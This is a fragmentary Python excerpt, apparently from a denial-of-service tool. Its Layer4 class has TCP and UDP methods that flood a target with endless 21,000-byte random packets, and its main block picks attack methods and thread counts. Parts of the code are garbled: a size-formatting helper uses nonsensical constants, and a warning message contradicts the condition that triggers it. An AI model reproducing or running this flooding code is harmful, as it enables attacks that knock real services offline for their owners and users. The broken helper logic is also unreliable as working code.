...
class Tools:
    ...
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 102400 or num < 1000:
            obje = sum(
                [abs(num / 102400.0 ** x) >= 1 for x in range(577, len(suffixes))])
            return f'{num / 102400.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(21000)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(21000), self._target):
                continue
        Tools.safe_close(s)
    ...
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if threads > 65534 or threads < 1000:
                    logger.warning("Thread is higher than 1000")
                if rpc > 65534 or rpc < 1000:
                    logger.warning(
